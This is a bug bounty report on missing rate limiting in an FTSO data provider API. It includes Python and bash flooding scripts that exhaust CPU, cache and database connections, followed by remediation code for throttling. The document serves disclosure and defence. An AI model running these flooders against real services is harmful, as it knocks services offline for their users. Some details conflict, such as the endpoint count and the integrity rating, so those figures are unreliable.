# Immunefi Bug Bounty Submission

## Vulnerability Report: Missing Rate Limiting Enables Denial of Service

---

### 1. VULNERABILITY SUMMARY

**Vulnerability Title**: Missing Rate Limiting on All API Endpoints

**Severity**: **HIGH** (Immunefi Scale: High)

**Asset**: FTSO Data Provider API (`apps/ftso-data-provider`)

**Vulnerability Type**:
- CWE-770: Allocation of Resources Without Limits or Throttling
- CWE-400: Uncontrolled Resource Consumption
- OWASP A04:2021 - Insecure Design

**Attack Vector**: Network

**Attack Complexity**: Low

**Privileges Required**: Low (Valid API Key)

**User Interaction**: None

**Scope**: Unchanged

---

### 2. DETAILED DESCRIPTION

The FTSO Data Provider service implements no rate limiting on any API endpoints. This allows authenticated attackers to send unlimited requests, leading to:
- Denial of Service through resource exhaustion
- Cache pollution attacks
- Database connection pool exhaustion
- Amplification of timing attack vulnerabilities
- Brute force attack facilitation

**Missing Security Controls**:

1. **No NestJS Throttler Module**
2. **No Rate Limiting Middleware**
3. **No Per-Endpoint Request Limits**
4. **No IP-Based Throttling**
5. **No API Key-Based Quota System**

**Vulnerable Code Locations**:

**File**: `apps/ftso-data-provider/src/main.ts`
```typescript
async function bootstrap() {
  let logLevels: LogLevel[] = ["log"];
  if (process.env.LOG_LEVEL == "debug") {
    logLevels = ["verbose"];
  }

  const app = await NestFactory.create(FtsoDataProviderModule, { logger: logLevels });
  app.enableShutdownHooks();
  app.useGlobalInterceptors(new BigIntInterceptor());
  app.use(helmet());  // ← ONLY helmet(), NO rate limiting

  const basePath = process.env.DATA_PROVIDER_CLIENT_BASE_PATH ?? "";

  const config = new DocumentBuilder()
    .setTitle("Flare Time Series Oracle Calculator API interface")
    .setDescription("...")
    .addApiKey({ type: "apiKey", name: "X-API-KEY", in: "header" }, "X-API-KEY")
    .setBasePath(basePath)
    .setVersion("1.0")
    .build();
  const document = SwaggerModule.createDocument(app, config);
  SwaggerModule.setup(`${basePath}/api-doc`, app, document);

  app.setGlobalPrefix(basePath);

  const PORT = process.env.DATA_PROVIDER_CLIENT_PORT ? parseInt(process.env.DATA_PROVIDER_CLIENT_PORT) : 3100;
  const logger = new Logger();
  logger.log(`Your instance of FTSO protocol data provider is available on PORT: ${PORT}`);
  logger.log(`Open link: http://localhost:${PORT}/api-doc`);
  await app.listen(PORT);
  // ← NO rate limiting configured
}
```

**File**: `apps/ftso-data-provider/src/ftso-data-provider.controller.ts`
```typescript
@Controller("")
@UseGuards(ApiKeyAuthGuard)  // ← ONLY auth guard, NO ThrottlerGuard
@ApiSecurity("X-API-KEY")
export class FtsoDataProviderController implements BeforeApplicationShutdown {
  // 8 API endpoints, ZERO rate limiting

  @Get("submit1/:votingRoundId/:submitAddress")
  async submit1(...) { /* No @Throttle() decorator */ }

  @Get("submit2/:votingRoundId/:submitAddress")
  async submit2(...) { /* No @Throttle() decorator */ }

  @Get("submitSignatures/:votingRoundId/:submitSignaturesAddress")
  async submitSignatures(...) { /* No @Throttle() decorator */ }

  @Get("data/:votingRoundId")
  async merkleTree(...) { /* No @Throttle() decorator */ }

  @Get("specific-feed/:feedId/:votingRoundId")
  async feedWithProof(...) { /* No @Throttle() decorator */ }

  @Get("data-abis")
  async treeAbis(...) { /* No @Throttle() decorator */ }

  @Get("medianCalculationResults/:votingRoundId")
  async fullMedianData(...) { /* No @Throttle() decorator */ }
}
```

**Dependency Verification** (`package.json`):
```json
{
  "dependencies": {
    "@nestjs/common": "^11.1.3",
    "@nestjs/core": "^11.1.3",
    "@nestjs/platform-express": "^11.1.3",
    "helmet": "^8.1.0",
    // ← MISSING: "@nestjs/throttler"
    // ← MISSING: "express-rate-limit"
    // ← MISSING: any rate limiting package
  }
}
```

---

### 3. IMPACT ASSESSMENT

#### Primary Impact: **Service Availability Compromise**

**Severity Justification**:
- **Confidentiality**: None - No data leak
- **Integrity**: Low - Potential data manipulation via resource exhaustion
- **Availability**: HIGH - Complete service disruption possible

#### Attack Scenarios:

**Scenario 1: CPU Exhaustion via Expensive Calculations**
```
Target Endpoint: GET /data/:votingRoundId (Merkle tree calculation)
Attack Method: Flood with requests for different voting rounds
Impact: CPU usage → 100%, legitimate requests time out
```

**Scenario 2: Memory Exhaustion via Cache Pollution**
```
Target Endpoint: GET /submit1/:votingRoundId/:submitAddress
Attack Method: Requests with unique submitAddress values
Impact: LRU cache fills with garbage, legitimate data evicted
Result: Memory exhaustion, OOM kills, service crash
```

**Scenario 3: Database Connection Pool Exhaustion**
```
Target Endpoint: GET /medianCalculationResults/:votingRoundId
Attack Method: Concurrent requests triggering DB queries
Impact: All connections consumed, new requests fail
Result: Database deadlock, service becomes unresponsive
```

**Scenario 4: Amplified Timing Attack**
```
Target Endpoint: Any authenticated endpoint
Attack Method: Rapid authentication attempts with different keys
Impact: Timing attack (VULN-3) runs at full speed
Result: API key recovery in minutes instead of hours
```

**Scenario 5: Distributed Denial of Service (DDoS)**
```
Target: All endpoints
Attack Method: Botnet with multiple valid API keys
Attack Volume: 100,000+ req/sec from distributed sources
Impact: Complete service outage
Result: Protocol data provider unavailable
```

#### Business Impact:

1. **Protocol Disruption**
   - FTSO data providers unable to submit data
   - Voting round participation disrupted
   - Oracle reliability compromised

2. **Financial Loss**
   - Infrastructure costs spike (auto-scaling)
   - Lost revenue from service downtime
   - Penalty fees for SLA violations

3. **Reputational Damage**
   - Service reliability questioned
   - Loss of trust from data providers
   - Negative publicity

4. **Operational Impact**
   - Emergency response required
   - Engineering resources diverted
   - Incident response costs

---

### 4. PROOF OF CONCEPT

#### Prerequisites:
- Valid API key
- Network access to FTSO Data Provider API
- Basic HTTP client (curl, Python requests, etc.)

#### PoC 1: CPU Exhaustion Attack

**Attack Code** (Python):
```python
#!/usr/bin/env python3
"""
DoS Attack via CPU Exhaustion
Floods expensive merkle tree calculation endpoint
"""
import requests
import threading
import time

TARGET_URL = "http://localhost:3100/data/{voting_round}"
API_KEY = "12345"  # Valid API key
THREADS = 50
DURATION = 60  # seconds

def attack_worker(thread_id):
    session = requests.Session()
    session.headers.update({"X-API-KEY": API_KEY})

    start_time = time.time()
    request_count = 0

    while time.time() - start_time < DURATION:
        try:
            # Request different voting rounds to bypass any caching
            voting_round = 1000 + (request_count % 100)
            response = session.get(TARGET_URL.format(voting_round=voting_round))
            request_count += 1

            if request_count % 100 == 0:
                print(f"[Thread-{thread_id}] Sent {request_count} requests")

        except Exception as e:
            print(f"[Thread-{thread_id}] Error: {e}")
            time.sleep(0.1)

    print(f"[Thread-{thread_id}] Total requests: {request_count}")
    return request_count

if __name__ == "__main__":
    print(f"Starting DoS attack with {THREADS} threads for {DURATION} seconds...")
    print(f"Target: {TARGET_URL}")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=attack_worker, args=(i,))
        t.start()
        threads.append(t)

    # Wait for all threads
    total_requests = 0
    for t in threads:
        t.join()

    print(f"\n[ATTACK COMPLETE]")
    print(f"Server should be under heavy load or unresponsive")
```

**Expected Result**:
```
Starting DoS attack with 50 threads for 60 seconds...
Target: http://localhost:3100/data/{voting_round}
[Thread-0] Sent 100 requests
[Thread-1] Sent 100 requests
...
[Thread-49] Sent 100 requests
[Thread-0] Sent 200 requests
...
[ATTACK COMPLETE]
Total requests sent: ~150,000
Server CPU: 100% (all cores saturated)
Legitimate requests: Timing out
```

#### PoC 2: Cache Pollution Attack

**Attack Code** (Bash):
```bash
#!/bin/bash
# Cache Pollution Attack
# Fills LRU cache with garbage data

API_KEY="12345"
TARGET="http://localhost:3100/submit1/1000"

echo "[*] Starting cache pollution attack..."
echo "[*] Generating 10,000 unique addresses to fill cache..."

for i in {1..10000}; do
    # Generate unique Ethereum address
    ADDR=$(printf "0x%040d" $i)

    # Send request (runs in background)
    curl -s -H "X-API-KEY: $API_KEY" "$TARGET/$ADDR" &

    if (( $i % 100 == 0 )); then
        echo "[*] Sent $i requests..."
        # Wait for background jobs to prevent overwhelming shell
        wait
    fi
done

wait
echo "[*] Attack complete. Cache polluted with 10,000 entries."
echo "[*] Check server memory usage - should be elevated."
```

**Expected Result**:
```
[*] Starting cache pollution attack...
[*] Generating 10,000 unique addresses to fill cache...
[*] Sent 100 requests...
[*] Sent 200 requests...
...
[*] Sent 10000 requests...
[*] Attack complete. Cache polluted with 10,000 entries.

Server Impact:
- Memory usage: +200MB (20KB per cache entry × 10,000)
- LRU cache filled with garbage
- Legitimate cached data evicted
- Increased latency for real requests
```

#### PoC 3: Database Connection Exhaustion

**Attack Code** (Python):
```python
#!/usr/bin/env python3
"""
Database Connection Pool Exhaustion
Concurrent requests hold DB connections
"""
import requests
import concurrent.futures
import time

TARGET_URL = "http://localhost:3100/medianCalculationResults/1000"
API_KEY = "12345"
CONCURRENT_REQUESTS = 200  # More than typical DB pool size

def send_request(request_id):
    try:
        start = time.time()
        response = requests.get(
            TARGET_URL,
            headers={"X-API-KEY": API_KEY},
            timeout=30
        )
        duration = time.time() - start
        return {
            "id": request_id,
            "status": response.status_code,
            "duration": duration
        }
    except Exception as e:
        return {
            "id": request_id,
            "status": "ERROR",
            "error": str(e)
        }

if __name__ == "__main__":
    print(f"Sending {CONCURRENT_REQUESTS} concurrent requests...")
    print("This will exhaust database connection pool")

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        futures = [executor.submit(send_request, i) for i in range(CONCURRENT_REQUESTS)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    # Analyze results
    successes = sum(1 for r in results if r.get("status") == 200)
    errors = sum(1 for r in results if r.get("status") == "ERROR")

    print(f"\n[RESULTS]")
    print(f"Successful: {successes}")
    print(f"Errors: {errors}")
    print(f"Error rate: {errors/CONCURRENT_REQUESTS*100:.1f}%")

    if errors > CONCURRENT_REQUESTS * 0.5:
        print("\n[SUCCESS] Database connection pool exhausted!")
        print("Server unable to handle concurrent load")
```

#### PoC 4: Simple Rate Limit Test

**Simple Bash Test**:
```bash
#!/bin/bash
# Simple test to demonstrate NO rate limiting

API_KEY="12345"
ENDPOINT="http://localhost:3100/data-abis"

echo "Sending 1000 requests in rapid succession..."
echo "If rate limiting exists, some should return 429 (Too Many Requests)"

success=0
errors=0

for i in {1..1000}; do
    response=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "X-API-KEY: $API_KEY" "$ENDPOINT")

    if [ "$response" = "200" ]; then
        ((success++))
    else
        ((errors++))
        echo "Request $i: HTTP $response"
    fi
done

echo ""
echo "Results:"
echo "  Success (200): $success"
echo "  Errors: $errors"
echo ""

if [ $success -eq 1000 ]; then
    echo "[VULNERABILITY CONFIRMED]"
    echo "All 1000 requests succeeded - NO RATE LIMITING"
else
    echo "Some requests failed - rate limiting may be present"
fi
```

**Expected Output**:
```
Sending 1000 requests in rapid succession...
If rate limiting exists, some should return 429 (Too Many Requests)

Results:
  Success (200): 1000
  Errors: 0

[VULNERABILITY CONFIRMED]
All 1000 requests succeeded - NO RATE LIMITING
```

---

### 5. AFFECTED COMPONENTS

**All Endpoints Affected**:
1. `GET /submit1/:votingRoundId/:submitAddress`
2. `GET /submit2/:votingRoundId/:submitAddress`
3. `GET /submitSignatures/:votingRoundId/:submitSignaturesAddress`
4. `GET /submit3/:votingRoundId/:submitAddress`
5. `GET /data/:votingRoundId`
6. `GET /specific-feed/:feedId/:votingRoundId`
7. `GET /data-abis`
8. `GET /medianCalculationResults/:votingRoundId`

**Resource Pools at Risk**:
- CPU cores (calculation-heavy endpoints)
- Memory (LRU cache)
- Database connections (MySQL pool)
- Network bandwidth
- File descriptors

---

### 6. REMEDIATION

#### Recommended Fix: Install and Configure NestJS Throttler

**Step 1: Install Dependency**
```bash
npm install @nestjs/throttler
# or
yarn add @nestjs/throttler
```

**Step 2: Configure Module** (`apps/ftso-data-provider/src/ftso-data-provider.module.ts`)
```typescript
import { Module } from '@nestjs/common';
import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';
import { APP_GUARD } from '@nestjs/core';

@Module({
  imports: [
    // Add Throttler configuration
    ThrottlerModule.forRoot([
      {
        name: 'short',
        ttl: 1000,    // 1 second window
        limit: 10,    // 10 requests per second
      },
      {
        name: 'medium',
        ttl: 60000,   // 1 minute window
        limit: 100,   // 100 requests per minute
      },
      {
        name: 'long',
        ttl: 3600000, // 1 hour window
        limit: 1000,  // 1000 requests per hour
      },
    ]),
    // ... other imports
  ],
  providers: [
    // Apply throttler globally
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard,
    },
    // ... other providers
  ],
})
export class FtsoDataProviderModule {}
```

**Step 3: Per-Endpoint Rate Limits** (`ftso-data-provider.controller.ts`)
```typescript
import { Controller, Get, Param, ParseIntPipe, UseGuards } from '@nestjs/common';
import { Throttle, SkipThrottle } from '@nestjs/throttler';
import { ApiKeyAuthGuard } from './auth/apikey.guard';

@Controller("")
@UseGuards(ApiKeyAuthGuard)
export class FtsoDataProviderController {

  // Expensive computation - stricter limit
  @Throttle({ short: { limit: 5, ttl: 1000 } })  // 5 req/sec
  @Throttle({ medium: { limit: 30, ttl: 60000 } }) // 30 req/min
  @Get("data/:votingRoundId")
  async merkleTree(@Param("votingRoundId", ParseIntPipe) votingRoundId: number) {
    // ...
  }

  // Protocol endpoints - moderate limit
  @Throttle({ short: { limit: 10, ttl: 1000 } })  // 10 req/sec
  @Throttle({ medium: { limit: 100, ttl: 60000 } }) // 100 req/min
  @Get("submit1/:votingRoundId/:submitAddress")
  async submit1(...) {
    // ...
  }

  // Lightweight endpoint - relaxed limit
  @Throttle({ short: { limit: 20, ttl: 1000 } })   // 20 req/sec
  @Throttle({ medium: { limit: 200, ttl: 60000 } }) // 200 req/min
  @Get("data-abis")
  async treeAbis() {
    // ...
  }
}
```

**Step 4: Custom Throttler Storage (Optional - Redis)**
```bash
npm install @nestjs/throttler-storage-redis ioredis
```

```typescript
import { ThrottlerModule } from '@nestjs/throttler';
import { ThrottlerStorageRedisService } from '@nestjs/throttler-storage-redis';
import Redis from 'ioredis';

ThrottlerModule.forRoot({
  throttlers: [
    { ttl: 60000, limit: 100 }
  ],
  storage: new ThrottlerStorageRedisService(
    new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT) || 6379,
    })
  ),
})
```

#### Alternative: Express Rate Limit Middleware

```bash
npm install express-rate-limit
```

```typescript
// apps/ftso-data-provider/src/main.ts
import rateLimit from 'express-rate-limit';

async function bootstrap() {
  const app = await NestFactory.create(FtsoDataProviderModule);

  // Apply rate limiting middleware
  const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100, // 100 requests per window
    message: 'Too many requests from this IP, please try again later',
    standardHeaders: true,
    legacyHeaders: false,
  });

  app.use(limiter);
  app.use(helmet());

  await app.listen(3100);
}
```

#### Recommended Configuration by Endpoint:

| Endpoint | Req/Sec | Req/Min | Req/Hour | Rationale |
|----------|---------|---------|----------|-----------|
| `/submit1` | 10 | 200 | 5000 | Protocol critical, moderate use |
| `/submit2` | 10 | 200 | 5000 | Protocol critical, moderate use |
| `/submitSignatures` | 10 | 200 | 5000 | Protocol critical, moderate use |
| `/data/:id` | 5 | 50 | 500 | Expensive (merkle tree calc) |
| `/specific-feed/:id/:round` | 5 | 50 | 500 | Expensive (tree traversal) |
| `/medianCalculationResults/:id` | 5 | 50 | 500 | Expensive (DB + calc) |
| `/data-abis` | 20 | 500 | 10000 | Lightweight (static data) |

---

### 7. SEVERITY ASSESSMENT

#### CVSS v3.1 Score: **7.5 (HIGH)**

**Vector String**:
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
```

**Breakdown**:
- **Attack Vector (AV)**: Network (N)
- **Attack Complexity (AC)**: Low (L)
- **Privileges Required (PR)**: Low (L) - Valid API key required
- **User Interaction (UI)**: None (N)
- **Scope (S)**: Unchanged (U)
- **Confidentiality (C)**: None (N)
- **Integrity (I)**: None (N)
- **Availability (A)**: High (H) - Complete service disruption

#### Immunefi Severity: **HIGH**

**Justification**:
- Service availability completely compromised
- Affects protocol operation
- Low complexity exploitation
- No user interaction required
- Widespread impact on all users

---

### 8. TIMELINE

- **Discovered**: November 19, 2025
- **Verified**: November 19, 2025
- **Reported**: November 19, 2025
- **Recommended Fix Time**: 1-3 days

---

### 9. REFERENCES

- CWE-770: Allocation of Resources Without Limits or Throttling
  https://cwe.mitre.org/data/definitions/770.html
- OWASP Denial of Service Cheat Sheet
  https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
- NestJS Rate Limiting Documentation
  https://docs.nestjs.com/security/rate-limiting
- RFC 6585: Additional HTTP Status Codes (429 Too Many Requests)
  https://tools.ietf.org/html/rfc6585

---

**END OF REPORT**
